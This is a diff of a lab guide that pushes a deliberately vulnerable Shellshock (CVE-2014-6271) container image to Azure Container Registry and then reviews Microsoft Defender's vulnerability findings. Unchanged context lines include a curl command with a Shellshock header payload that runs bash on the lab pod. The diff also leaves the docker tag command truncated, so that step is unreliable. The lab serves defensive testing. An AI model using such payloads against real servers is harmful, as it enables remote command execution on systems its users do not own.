@@ -17,11 +17,11 @@ docker pull vulnerables/cve-2014-6271
 Run the following commands to properly tag your images to match your ACR account name.
 
 ```
- docker tag  vulnerables/cve-2014-6271  [ACR-LOGINSERVER]/cve-2014-6271
+ docker tag  vulnerables/cve-2014-6271  [ACR-LOGINSERVER]/
+ 
  ```
 
  push docker image to ACR
-
 
 ```
  docker push [ACR-LOGINSERVER]/cve-2014-6271
@@ -101,5 +101,13 @@ and
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" http://[ip-address-shell-shock-pod]/cgi-bin/vulnerable
 ```
 
+Now, wait for Defender to raise a recommendation under the ACR to resolve vulnerabilities found
+
+![container-vul](/images/container-vuln.png)
+
+Also, you may want to use the Cloud Security Explorer with the specific CVE-ID
+
+
+![container-vuln-cloudsecexplorer](/images/container-vuln-cloud-sec-explorer.png)
 
 
